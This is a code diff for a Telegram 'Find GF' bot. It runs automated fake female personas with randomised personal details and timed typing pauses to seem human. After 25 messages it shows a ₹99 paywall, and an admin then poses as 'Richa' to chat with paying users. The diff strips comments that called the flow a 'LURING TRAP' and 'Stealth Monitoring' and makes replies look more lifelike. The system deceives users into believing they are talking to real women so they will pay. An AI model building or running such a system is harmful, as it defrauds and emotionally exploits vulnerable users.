@@ -81,7 +81,6 @@ bot.on('callback_query', async (query) => {
         bot.sendChatAction(chatId, 'typing');
         await sleep(3000); 
 
-        // LURING TRAP (Dynamic messages before paywall lock)
         if (user.state === 'NEW' || user.state === 'AWAITING_PAYMENT' || user.state === 'LURING') {
             user.state = 'LURING';
             if (user.nudges && user.nudges.length > 0) user.nudges.forEach(clearTimeout);
@@ -131,7 +130,7 @@ bot.on('callback_query', async (query) => {
 });
 
 // ==========================================
-// 2. MAIN CHAT LOGIC (With Stealth Monitoring & Deep Analysis)
+// 2. MAIN CHAT LOGIC 
 // ==========================================
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
@@ -166,7 +165,7 @@ bot.on('message', async (msg) => {
         user.nudges = [];
     }
 
-    // PAYMENT SCREENSHOT LISTENER & PAYWALL
+    // PAYMENT SCREENSHOT LISTENER 
     if (user.state === 'AWAITING_PAYMENT' || user.state === 'LURING') {
         if (msg.photo || msg.document) {
             bot.sendMessage(ADMIN_ID, `🧾 <b>Payment Proof Received</b> from User [ID: ${chatId}]\nCheck the screenshot and use <code>/approve ${chatId}</code> to activate VIP.`, {parse_mode: 'HTML'});
@@ -215,7 +214,6 @@ bot.on('message', async (msg) => {
             sendFindGfButton(chatId);
         };
 
-        // CHAT LIMIT EXHAUSTION (Set to 25)
         if (user.msgCount >= 25) {
             await leaveChat(user.state === 'CHATTING_1' ? 'CHAT_2_START' : 'RICHA_HANDOFF'); 
             return;
@@ -224,10 +222,30 @@ bot.on('message', async (msg) => {
         let reply = "";
         let matched = true; 
 
-        // --- SMART DEEP ANALYSIS CHAT LOGIC ---
+        // --- NEW SPLIT MESSAGE LOGIC FOR LOCATION ---
+        if (textLower.match(/\b(kaha|from|where|jagah|city)\b/)) {
+            bot.sendMessage(chatId, `<b>${displayName}:</b> ${getLocation()}`, { parse_mode: 'HTML' });
+            bot.sendChatAction(chatId, 'typing');
+            await sleep(2000); // 2 second ka gap aur typing
+            const askBack = ["aap kaha se?", "you?", "u?", "Aap?", "Tum?"][Math.floor(Math.random()*5)];
+            bot.sendMessage(chatId, `<b>${displayName}:</b> ${askBack}`, { parse_mode: 'HTML' });
+            user.unknownCount = 0;
+            return; // Yahan se return taki aur koi msg na jaye
+        }
         
-        // Photo / Pic / Meet request
-        if (textLower.match(/(see u|see you|pic|photo|image|meet|milna|dekhna|dekhu|dekh skta|dekh sakti|mil)/)) {
+        // --- NEW SPLIT MESSAGE LOGIC FOR FAMILY ---
+        else if (textLower.match(/(ghr|ghar|family|parivar|kaun kaun|kon kon)/)) {
+            const sibling = ["chhota bhai", "bda bhai", "chhoti behn", "bdi behn"][Math.floor(Math.random()*4)];
+            bot.sendMessage(chatId, `<b>${displayName}:</b> mummy papa or ek ${sibling} h`, { parse_mode: 'HTML' });
+            bot.sendChatAction(chatId, 'typing');
+            await sleep(2000); // 2 second gap
+            bot.sendMessage(chatId, `<b>${displayName}:</b> aur aapke?`, { parse_mode: 'HTML' });
+            user.unknownCount = 0;
+            return; 
+        }
+
+        // BAAKI LOGIC SAME HAI...
+        else if (textLower.match(/(see u|see you|pic|photo|image|meet|milna|dekhna|dekhu|dekh skta|dekh sakti|mil)/)) {
             reply = [
                 "nahi", "sorry", "I can't", "abhi to janti bhi nahi", "nahi pehle baat kro", 
                 "sorry baat kro pehle", "nahi de skti", "ni yr", "aap bhej do apna m ni de skti", "random har kisi ko konn dega yrr"
@@ -239,26 +257,17 @@ bot.on('message', async (msg) => {
         else if (textLower.match(/(height|haight|lambai|lambi|tall)/)) {
             reply = ["5'1\"", "5'2\"", "5'3\"", "5'4\"", "5'5\"", "5'6\""][Math.floor(Math.random()*6)];
         }
-        // Family Details
-        else if (textLower.match(/(ghr|ghar|family|parivar|kaun kaun|kon kon)/)) {
-            const sibling = ["chhota bhai", "bda bhai", "chhoti behn", "bdi behn"][Math.floor(Math.random()*4)];
-            reply = `mummy papa or ek ${sibling} h, aur aapke?`;
-        }
-        // Current Activity (Kya kar rahi ho abhi)
         else if (textLower.match(/(abhi kya|kya kr rhi|kya kar rahi|kkrh|kkrho|kuch kr|free ho)/)) {
             reply = ["kpde dhoye h", "kuch ni", "nothing", "free hu"][Math.floor(Math.random()*4)];
         }
-        // Profession/Study (Kya karti ho)
         else if (textLower.match(/(study|padhai|kya krti|kya karte|kaam kya|profession|job|kaam krti)/)) {
             const studies = ["BSc", "B.Ed", "BA", "BCom", "MCom"];
             const study = studies[Math.floor(Math.random() * studies.length)];
             reply = [`study krri hu ${study}`, "silai krti hu", "pdhai puri krli h"][Math.floor(Math.random()*3)];
         }
-        // Relationship Proposal
         else if (textLower.match(/(gf|girlfriend|friend|frnd|relation|relationship|dost|set|setting)/)) {
             reply = ["time do thoda", "dekhte h", "kya krte ho", "sochungi", "nahi"][Math.floor(Math.random()*5)];
         }
-        // Past BF / Ex
         else if (textLower.match(/(bf|boyfriend|boy friend|ex |kabhi bf|past relation)/)) {
             reply = ["haa tha brkup hogya chhoro", "ex tha or btao", "ha tha aage ki baat krte h", "nahi", "ni"][Math.floor(Math.random()*5)];
         }
@@ -280,15 +289,9 @@ bot.on('message', async (msg) => {
         else if (textLower.match(/\b(kese|kesi|hru|how are|kya hal|kya haal)\b/)) {
             reply = ["bdhiya", "good", "mst", "achi", "fine"][Math.floor(Math.random()*5)];
         }
-        // Where are you from + CROSS QUESTION
-        else if (textLower.match(/\b(kaha|from|where|jagah|city)\b/)) {
-            const askBack = ["aap kaha se?", "you?", "u?", "Aap?", "Tum?"][Math.floor(Math.random()*5)];
-            reply = `${getLocation()}, aur ${askBack}`;
-        }
         else if (textLower.match(/\b(age|saal|umar|old)\b/)) {
             reply = getAge().toString();
         }
-        // AJEEB SAWAL / UNMATCHED TEXT LOGIC (4 Strikes)
         else {
             matched = false;
             user.unknownCount = (user.unknownCount || 0) + 1;
@@ -304,6 +307,58 @@ bot.on('message', async (msg) => {
             ][Math.floor(Math.random()*10)];
         }
 
-        // Reset unknown counter if a valid question was matched
-        if (matched) user.unknownCount = 0
+        if (matched) user.unknownCount = 0;
+
+        bot.sendMessage(chatId, `<b>${displayName}:</b> ${reply}`, { parse_mode: 'HTML' });
+    }
+    
+    // ADMIN CHAT (RICHA)
+    else if (user.state === 'RICHA_CHAT' && user.isVip) {
+        bot.sendMessage(ADMIN_ID, `📩 <b>Message from User</b> [ID: ${chatId}]\n\n${text}`, { parse_mode: 'HTML' });
         
+        if (user.richaTimeout) clearTimeout(user.richaTimeout);
+        
+        user.richaTimeout = setTimeout(() => {
+            if (users[chatId] && users[chatId].state === 'RICHA_CHAT') {
+                bot.sendMessage(chatId, "<i>*Richa has left the chat.*</i> 💔\n\nDusri GF find karne ke liye wapas 'Find GF' dabayein.", { parse_mode: 'HTML' });
+                users[chatId].state = 'CHAT_1_START'; 
+                sendFindGfButton(chatId);
+            }
+        }, 60000); 
+    }
+});
+
+// ==========================================
+// 3. COLORFUL PAYWALL & VIP 
+// ==========================================
+function sendPaywall(chatId) {
+    const paywallText = `🔒 <b>VIP Pass Required</b> ✨\n\nAage baat continue rakhne ke liye 24-hours ka VIP pass lein.\n<b>Membership Fee: ₹99</b>\n\n⚠️ <i>Payment karne ke baad apna Payment Screenshot yahin par bhejein!</i>\n\n<span class="tg-spoiler">This is a strictly digital entertainment service providing 24-hour access to automated virtual personas and manual chat support. By proceeding with the payment, you acknowledge that you are purchasing a digital membership for entertainment purposes only. No physical product is involved, and fees are strictly non-refundable.</span>`;
+    
+    bot.sendMessage(chatId, paywallText, {
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: [[{ text: "💖 Pay ₹99 & Unlock Chat ✨", url: PAYMENT_LINK }]] }
+    });
+}
+
+function sendFindGfButton(chatId) {
+    bot.sendMessage(chatId, "Menu:", {
+        reply_markup: { inline_keyboard: [[{ text: "💞 Find GF 💘", callback_data: "find_gf" }]] }
+    });
+}
+
+bot.onText(/\/approve (.+)/, (msg, match) => {
+    if (msg.chat.id.toString() !== ADMIN_ID) return;
+    
+    const targetId = match[1];
+    if (users[targetId]) {
+        users[targetId].isVip = true;
+        users[targetId].vipExpiry = Date.now() + (24 * 60 * 60 * 1000); 
+        users[targetId].state = 'CHAT_1_START';
+        bot.sendMessage(ADMIN_ID, `✅ User ${targetId} VIP activated for 24h.`);
+        bot.sendMessage(targetId, "✅ <b>Payment Successful!</b> ✨\nVIP Pass Active for 24 hours.\n\nNayi chat ke liye niche click kare 👇", {
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[{ text: "💞 Find GF 💘", callback_data: "find_gf" }]] }
+        });
+    }
+});
+                        
